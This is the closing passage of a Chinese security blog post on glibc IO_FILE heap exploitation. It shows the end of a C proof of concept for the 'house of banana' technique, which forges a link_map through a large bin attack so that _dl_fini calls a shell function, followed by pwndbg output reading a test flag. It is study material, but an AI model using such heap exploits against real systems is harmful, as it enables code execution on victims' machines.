class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  <span class="comment">// force p1 insert in to the largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node - <span class="number">0x20</span>);  <span class="comment">// push p2 into unsoteded bin</span></span><br><span class="line">  <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);          <span class="comment">// force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 类似一个 uaf 修改</span></span><br><span class="line">  <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2 - <span class="number">0x10</span>;  <span class="comment">// chunk_header</span></span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x28</span>) = fake;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x31c</span>) = <span class="number">0x4011d</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x110</span>) = fake + <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x48</span>) = fake + <span class="number">0x58</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x58</span>) = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x120</span>) = fake + <span class="number">0x48</span>;</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(fake + <span class="number">0x50</span>) = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 修改 _rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next 的地址为 p2</span></span><br><span class="line">  <span class="comment">// 最后一个linkmap链表遍历 p2</span></span><br><span class="line">  <span class="comment">// 建议 p *(struct link_map *) p2_addr 看一下</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 问题：assert i &lt; nloaded 错误，因此要将 (struct linkmap *p2) -&gt;l_next 置为0</span></span><br><span class="line">  p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// l_init_called 为0</span></span><br><span class="line">  <span class="comment">// *(uint64_t*)(fake+0x31c) = 0x4011d; 像是一个magic number</span></span><br><span class="line">  <span class="comment">// 必须为其余类型的值，因此打印出来替换</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后的程序崩溃了😥.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9242 &lt;_dl_fini+514&gt;    nop    word ptr [rax + rax]</span></span><br><span class="line"><span class="comment">    0x7ffff7fc9248 &lt;_dl_fini+520&gt;    mov    qword ptr [rbp - 0x38], rax</span></span><br><span class="line"><span class="comment">  ► 0x7ffff7fc924c &lt;_dl_fini+524&gt;    call   qword ptr [rax] &lt;shell&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">    #0  0x000055555555529b in shell () at house_of_banana.c:7</span></span><br><span class="line"><span class="comment">    #1  0x00007ffff7fc924e in _dl_fini () at ./elf/dl-fini.c:142</span></span><br><span class="line"><span class="comment">    #2  0x00007ffff7c45495 in __run_exit_handlers (status=0,</span></span><br><span class="line"><span class="comment">    # ...</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 但是发现在gdb 调试情况下可以执行一次命令就会崩溃</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; c</span></span><br><span class="line"><span class="comment">Continuing.</span></span><br><span class="line"><span class="comment">process 6591 is executing new program: /usr/bin/dash</span></span><br><span class="line"><span class="comment">Error in re-setting breakpoint 2: Function &quot;shell&quot; not defined.</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">$ cat flag.txt</span></span><br><span class="line"><span class="comment">[Attaching after Thread 0x7ffff7fa7740 (LWP 6591) vfork to child process 6594]</span></span><br><span class="line"><span class="comment">[New inferior 2 (process 6594)]</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">[Detaching vfork parent process 6591 after child exec]</span></span><br><span class="line"><span class="comment">[Inferior 1 (process 6591) detached]</span></span><br><span class="line"><span class="comment">process 6594 is executing new program: /usr/bin/cat</span></span><br><span class="line"><span class="comment">[Thread debugging using libthread_db enabled]</span></span><br><span class="line"><span class="comment">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span></span><br><span class="line"><span class="comment">flag&#123;house_of_banana_is_good&#125;</span></span><br><span class="line"><span class="comment">[Inferior 2 (process 6594) exited normally]</span></span><br><span class="line"><span class="comment">$ [5]  + 6580 suspended (tty output)  gdb house_of_banana</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275968.htm">IO_FILE 入门</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm">House of cat新型glibc中IO利用手法解析|安全招聘|kanxue.com</a></li>
<li><a target="_blank" rel="noopener" href="https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222948">house of banana-安全客</a></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/IO-FILE/" rel="tag"># IO_FILE</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/10/18/Android-2/" rel="prev" title="Android-2">
      <i class="fa fa-chevron-left"></i> Android-2
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/" rel="next" title="鹏程杯">
      鹏程杯 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  


          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#large-bin-attck"><span class="nav-number">1.1.</span> <span class="nav-text">large bin attck</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IO-%E6%B5%81"><span class="nav-number">1.2.</span> <span class="nav-text">IO 流</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FSOP"><span class="nav-number">1.3.</span> <span class="nav-text">FSOP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-apple"><span class="nav-number">2.</span> <span class="nav-text">house of apple</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-cat"><span class="nav-number">3.</span> <span class="nav-text">house of cat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#house-of-banana"><span class="nav-number">4.</span> <span class="nav-text">house of banana</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools-filepointer"><span class="nav-number">5.</span> <span class="nav-text">pwntools filepointer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">6.</span> <span class="nav-text">测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-banana-1"><span class="nav-number">6.1.</span> <span class="nav-text">house of banana</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ham5ter</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Ha0-Y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ha0-Y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:yuanhao.it@foxmail.com" title="E-Mail → mailto:yuanhao.it@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ham5ter</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">364k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">11:01</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
